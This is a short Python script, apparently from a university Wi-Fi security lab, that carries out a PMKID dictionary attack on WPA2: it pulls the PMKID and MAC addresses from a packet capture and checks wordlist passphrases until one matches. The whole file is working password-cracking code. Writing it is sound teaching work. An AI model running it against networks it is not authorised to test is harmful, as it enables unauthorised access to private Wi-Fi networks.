#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
PMKID attack with wordlist
"""

__author__      = "Godi Matthieu et Issolah Maude"
__copyright__   = "Copyright 2022, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 	= "abraham.rubinstein@heig-vd.ch"
__status__ 	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import utils

# File containing the list of potentials passphrases
FILENAME = "wordlist.txt"

# Read capture file -- it contains assoReq, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")

# Recherche du assoReq
assoReq = utils.first_beacon(wpa)

# Needed parameter for the attack
ssid        = assoReq.info
APmac       = a2b_hex(assoReq.addr2.replace(":", ""))
HS1         = utils.handshake_first_pkg_with_ap(wpa, APmac)
Clientmac   = a2b_hex(HS1.addr1.replace(":", ""))
pmkid       = raw(HS1)[-20:-4]

# Open file
wordlist = open(FILENAME, "r")

# We test each passphrase in the file
for word in wordlist.readlines():
    # To remove the end of line character
    wrd = word.strip()
    passPhrase = str.encode(wrd) 

    # Get pmk
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    # Get PMKID
    wordPMKID = hmac.new(pmk, b"PMK Name" + APmac + Clientmac,hashlib.sha1)
    
    # Compare computed PMKID with the one from the capture
    if wordPMKID.digest()[:16] == pmkid:
        # If they match we print the passphrase
        print ("Passphrase found : " + wrd)
        exit() # Passphrase found -> exit
# No passphrase found
print("No matching passphrases found")